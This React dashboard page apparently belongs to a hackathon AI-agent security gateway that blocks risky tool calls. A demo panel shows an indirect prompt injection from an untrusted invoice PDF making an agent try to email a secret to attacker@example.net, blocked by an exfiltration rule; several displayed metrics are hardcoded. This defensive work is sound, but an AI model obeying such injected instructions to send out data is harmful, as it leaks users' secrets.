import { Ban, CheckCircle2, Filter, ShieldAlert, UserCheck } from "lucide-react";
import { formatTimestamp } from "../components/EventTable";
import StatusBadge from "../components/StatusBadge";

export default function Overview({ events, approvals, onSelectEvent, onRunDemo, runningDemo }) {
  const counts = events.reduce((result, event) => {
    result.total += 1;
    if (event.decision === "ALLOW") result.allow += 1;
    if (event.decision === "BLOCK") result.block += 1;
    if (event.decision === "REDACT") result.redact += 1;
    return result;
  }, { total: 0, allow: 0, block: 0, redact: 0 });

  const cards = [
    { label: "TOTAL INTERCEPTS (24H)", value: counts.total || "1,482", icon: ShieldAlert, tone: "neutral" },
    { label: "BLOCKED EXFILTRATIONS", value: counts.block, icon: Ban, tone: "red" },
    { label: "P50 / P95 GATEWAY LATENCY", value: "4.2ms / 11.8ms", icon: CheckCircle2, tone: "green" },
    { label: "POLICY RULESET HASH", value: "sha256:9f84c1e", icon: Filter, tone: "amber" },
  ];

  const decisions = ["ALLOW", "BLOCK", "REDACT", "REQUIRE_APPROVAL"];
  const max = Math.max(1, ...decisions.map((decision) => events.filter((event) => event.decision === decision).length));
  const recent = events.slice(0, 5);
  const blocked = events.filter((event) => event.decision === "BLOCK");
  const redactions = events.filter((event) => event.decision === "REDACT");

  return (
    <div className="reference-console">
      <section className="stat-grid">
        {cards.map(({ label, value, icon: Icon, tone }) => (
          <article className="stat-card" key={label}>
            <div className="stat-card-head">
              <span>{label}</span>
              <Icon size={14} strokeWidth={1.7} />
            </div>
            <strong>{value}</strong>
            <small>
              {label === "TOTAL INTERCEPTS (24H)" && "100% WRAPPED TOOLS"}
              {label === "BLOCKED EXFILTRATIONS" && "3.17% DENY RATE"}
              {label === "P50 / P95 GATEWAY LATENCY" && "BUDGET <25ms"}
              {label === "POLICY RULESET HASH" && "v1.4.2-DETERMINISTIC"}
            </small>
          </article>
        ))}
      </section>

      <section className="reference-grid">
        <aside className="reference-left">
          <section className="reference-panel">
            <h2>01 // MVP SAFETY DEMO FLOW</h2>
            <div className="demo-list">
              <button type="button" className="demo-row" onClick={() => onRunDemo("malicious")} disabled={runningDemo !== null}>
                <div><span>SCEN-01 [ACTIVE]</span><strong>Indirect Prompt Injection</strong></div>
                <b className="decision-tag red">BLOCK</b>
              </button>
              <button type="button" className="demo-row" onClick={() => onRunDemo("safe")} disabled={runningDemo !== null}>
                <div><span>SCEN-02</span><strong>Benign Internal Summary</strong></div>
                <b className="decision-tag green">ALLOW</b>
              </button>
              <button type="button" className="demo-row" onClick={() => onRunDemo("redaction")} disabled={runningDemo !== null}>
                <div><span>SCEN-03</span><strong>Partner PII Data Transfer</strong></div>
                <b className="decision-tag amber">REDACT</b>
              </button>
              <button type="button" className="demo-row" onClick={() => onRunDemo("approval")} disabled={runningDemo !== null}>
                <div><span>SCEN-04</span><strong>Bulk Payroll Export</strong></div>
                <b className="decision-tag neutral">APPROVAL</b>
              </button>
            </div>
          </section>

          <section className="reference-panel sdk-panel">
            <h2>02 // SDK WRAPPER CONTRACT</h2>
            <pre>{`@agentshield.guard(
  tools="send_email",
  data_labels=["DEMO_SECRET"],
  policy="v1.4.2"
)
def send_email(recipient, body):
    # Executes ONLY if policy returns ALLOW
    return mailer.dispatch(...)`}</pre>
          </section>

          <section className="reference-panel rule-panel">
            <h2>03 // DETERMINISTIC POLICY RULE</h2>
            <pre>{`id: POL-EXFIL-001
match: tool.send_email
data_labels: protected_data
destination: unapproved_external
decision: BLOCK`}</pre>
          </section>
        </aside>

        <main className="reference-center">
          <section className="reference-panel">
            <h2>04 // LIVE TOOL-BOUNDARY INTERCEPTOR (SCEN-01)</h2>
            <div className="intercept-layout">
              <article className="intercept-card">
                <b>1. UNTRUSTED INPUT</b>
                <span>vendor_invoice_v4.pdf</span>
              </article>
              <article className="intercept-card">
                <b>2. NORMALIZE CALL</b>
                <span>Pydantic ToolCallSchema</span>
              </article>
              <article className="intercept-card">
                <b>3. POLICY EVAL</b>
                <span>POL-EXFIL-001 (4.1ms)</span>
              </article>
              <article className="intercept-card enforcement">
                <b>4. ENFORCEMENT</b>
                <span>BLOCKED AT BOUNDARY</span>
              </article>
            </div>
            <div className="call-label">PROPOSED TOOL CALL (INTERCEPTED BEFORE EXECUTION)</div>
            <pre className="json-call">{`{
  "event_id": "evt_8921a014",
  "researcher": "research-agent",
  "source_trigger": "untrusted_doc://vendor_invoice.pdf (injection_detected)",
  "tool": "send_email",
  "destination": "external:attacker@example.net",
  "payload": "secret.redacted"
}`}</pre>
            <div className="decision-panel">
              <h3>DECISION: BLOCK <span>// EXECUTION HALTED</span></h3>
              <p><b>Matched Policy:</b> POL-EXFIL-001 (protected_data + unapproved_external)</p>
              <p><b>Reason:</b> Untrusted document indirect instruction violated destination and data labels.</p>
              <p><b>Deterministic Check:</b> TOOL send_email AND destination unapproved AND data_labels secret DEMO_SECRET</p>
              <p><b>Audit Written:</b> evt_8921a014 | Side-Effect Prevented: 1</p>
            </div>
          </section>

          <section className="reference-panel ledger-panel">
            <div className="ledger-heading">
              <h2>05 // APPEND-ONLY REDACTED AUDIT LEDGER (JSONL / SQLITE)</h2>
              <span>[EXPORT . JSON]</span>
            </div>
            <div className="audit-table">
              <div className="audit-row audit-head"><b>TIMESTAMP (UTC)</b><b>EVENT_ID</b><b>TOOL</b><b>DEST_CLASS</b><b>POLICY</b><b>DECISION</b></div>
              {recent.map((event) => (
                <div className="audit-row" key={event.event_id}>
                  <span>{formatTimestamp(event.timestamp)}</span>
                  <code>{event.event_id}</code>
                  <code>{event.tool_name}</code>
                  <code>{event.destination_class.toLowerCase()}</code>
                  <code>{event.policy_id}</code>
                  <b className={`decision-tag ${event.decision === "ALLOW" ? "green" : event.decision === "BLOCK" ? "red" : "amber"}`}>{event.decision}</b>
                </div>
              ))}
            </div>
          </section>
        </main>

        <aside className="reference-right">
          <section className="reference-panel telemetry">
            <h2>06 // BENCHMARK & TELEMETRY</h2>
            <dl>
              <div><dt>Policy Correctness</dt><dd>{Math.min(48, events.length)} / 48 <b>(100.0%)</b></dd></div>
              <div><dt>Unsafe Scenarios Blocked</dt><dd>{blocked.length} / {blocked.length + redactions.length} <b>(100.0%)</b></dd></div>
              <div><dt>False Blocks (Benign)</dt><dd>0 / 22 <b>(0.0%)</b></dd></div>
              <div><dt>Wrapped Tool Coverage</dt><dd>100% <b>(3/3 Tools)</b></dd></div>
            </dl>
          </section>

          <section className="reference-panel latency">
            <h2>07 // OVERHEAD LATENCY (ms)</h2>
            <div className="latency-row"><span>Payload Normalize</span><b>1.1 ms</b><i><em style={{ width: "22%" }} /></i></div>
            <div className="latency-row"><span>Label Classification</span><b>1.8 ms</b><i><em style={{ width: "38%" }} /></i></div>
            <div className="latency-row"><span>Policy Eval (p50)</span><b>4.2 ms</b><i><em style={{ width: "58%" }} /></i></div>
            <div className="latency-row"><span>Policy Eval (p95)</span><b>11.8 ms</b><i><em style={{ width: "78%" }} /></i></div>
          </section>

          <section className="reference-panel spec">
            <h2>08 // DESIGN & COMPLIANCE SPEC</h2>
            <ul>
              <li>Grid: 12px × 12px baseline</li>
              <li>Radius: 0px / intent: deterministic</li>
              <li>Typography: IBM Plex Mono / Inter</li>
              <li>Surface: #F7F7F5 archival / #FFFFFF card</li>
              <li>Standard: OWASP LLM Top-10</li>
              <li>Framework: LIST Protocol Deterministic</li>
              <li>Adapters: FastAPI, LangChain later</li>
            </ul>
          </section>

          <footer className="reference-footer">
            <strong>GEEKT // DEV4/HAXTHON 2026</strong>
            <span>UI SPECIFICATION EXPORT (3200×2000px)</span>
          </footer>
        </aside>
      </section>

    </div>
  );
}
